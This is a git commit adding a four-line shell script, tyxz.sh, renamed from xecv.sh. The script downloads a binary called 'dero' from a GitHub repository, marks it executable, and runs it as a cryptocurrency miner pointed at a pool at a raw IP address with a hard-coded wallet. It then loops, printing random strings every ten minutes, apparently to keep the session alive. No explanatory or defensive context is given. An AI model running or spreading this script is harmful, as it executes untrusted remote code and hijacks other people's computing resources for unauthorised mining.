7c9940b1d387abf2fba842c6e9782115ef32847d
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-11-12 22:31:55 +0700

    Update and rename xecv.sh to tyxz.sh

---
+++ tyxz.sh
@@ -0,0 +1,4 @@
+wget https://github.com/aqshakuy/dora/raw/main/dero
+chmod 777 dero
+./dero -w dERoSCQeRCe3GVBEHoJh2tgR2KZNF22gcCuYW29ZuAJFGk9rA7UWFwdPcXzxnXLvQ4V8WdntxVoxK4qruF2GahFf49oRxiMH8H -r 45.76.162.175:80 -p stratum -m 3 
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
